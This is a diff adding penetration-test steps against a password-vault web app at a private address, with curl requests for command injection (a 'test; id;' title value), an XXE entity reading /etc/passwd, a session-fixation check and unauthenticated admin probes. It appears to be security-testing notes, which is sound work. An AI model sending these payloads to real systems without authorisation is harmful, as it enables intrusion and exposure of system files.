@@ -82,5 +82,42 @@ Should I test the untested ones (Command Injection, XXE, Broken Authentication, 
 
 ============================================================    
 
-Test Command Injection.
+1. Command Injection
+Test in vault endpoints (title, username fields):
 
+curl -X POST http://10.0.0.10/vault/add \
+  -H "Content-Type: application/json" \
+  -H "Cookie: connect.sid=YOUR_SESSION" \
+  -d '{"title":"test; id;","username":"test","password":"test","url":"http://test.com"}'
+Look for command output in response (uid=, gid=, etc.).
+
+2. XXE (XML External Entity)
+Test if app accepts XML input (unlikely with JSON API, but check):
+
+curl -X POST http://10.0.0.10/vault/add \
+  -H "Content-Type: application/xml" \
+  -H "Cookie: connect.sid=YOUR_SESSION" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+Look for file contents in response.
+
+3. Broken Authentication
+Test session fixation - capture pre-login cookie, login, verify if old cookie still works:
+
+# Capture cookie before login
+curl -c cookies.txt http://10.0.0.10/login
+ 
+# Login with credentials
+curl -b cookies.txt -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser","password":"testpass"}'
+ 
+# Check if old cookie grants access to /vault
+curl -b cookies.txt http://10.0.0.10/vault
+If old cookie works after login = Session Fixation vulnerability.
+
+4. BFLA (Broken Function Level Authorization)
+Test if unauthenticated user can access admin/protected functions:
+
+curl http://10.0.0.10/admin
+curl http://10.0.0.10/api/admin
+curl http://10.0.0.10/api/users
